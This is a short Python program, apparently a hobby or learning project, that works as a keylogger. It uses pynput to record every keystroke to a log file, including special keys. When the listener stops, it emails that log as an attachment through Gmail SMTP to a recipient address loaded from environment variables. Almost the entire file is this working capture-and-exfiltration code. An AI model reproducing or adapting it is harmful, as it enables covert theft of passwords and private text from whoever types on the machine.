from pynput import keyboard
import smtplib
import ssl
from email.message import EmailMessage
from getpass import getpass
from pathlib import Path
import os
# Import find_dotenv along with load_dotenv
from dotenv import load_dotenv, find_dotenv

# make keylogger file
log_file = open("keystrokes.log", "a", encoding="utf-8", buffering=1)

# store characters when pressed
def on_press(key):
    try:
        # Handles regular alphanumeric keys (letters, numbers)
        print(f"Alphanumeric key pressed: {key.char}")
        log_file.write(key.char)
    except AttributeError:
        # Handles special keys (Ctrl, Shift, Space, Arrows, etc.)
        print(f"Special key pressed: {key}")
        # Handle special keys gracefully so they don't break your text string
        if key == keyboard.Key.space:
            log_file.write(" ")
        elif key == keyboard.Key.enter:
            log_file.write("\n")  # Hit enter? Actually go to a new line!
        elif key == keyboard.Key.tab:
            log_file.write("\t")
        else:
            # For other special keys (Ctrl, Shift, etc.), wrap them in brackets
            log_file.write(f"[{key.name}]")
    # FORCE Python to write to the hard drive immediately
    log_file.flush() 

def on_release(key):
    print(f"Key released: {key}")
    # Stop the listener when the Escape key is pressed
    if key == keyboard.Key.esc:
        print("Exiting listener...")
        return False

# send email with the python keylogger in it
def send_email(msg, app_password):
    with smtplib.SMTP_SSL(
        "smtp.gmail.com",
        465,
        context=ssl.create_default_context(),
        timeout=30,
    ) as smtp:
        smtp.login(msg["From"], app_password)
        smtp.send_message(msg)

# Collect keyboard events until it is stopped or 'esc' is pressed
try: 
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
finally:
    # send file after session is done
    log_file.close()
    # get vars
    load_dotenv(find_dotenv())
    Sender = os.getenv("SENDER_EMAIL")
    Receiver = os.getenv("RECEIVER_EMAIL")
    Password = os.getenv("EMAIL_PASSWORD")
    file_path = Path("keystrokes.log")
    # setup email
    msg = EmailMessage()
    msg["Subject"] = "Log Update"
    msg["From"] = Sender
    msg["To"] = Receiver
    msg.set_content("Logger")
    msg.add_attachment(
    file_path.read_bytes(),
    maintype="application",
    subtype="octet-stream",
    filename=file_path.name,
    )
    # send email
    send_email(msg, Password)
    print("Email submitted successfully.") 








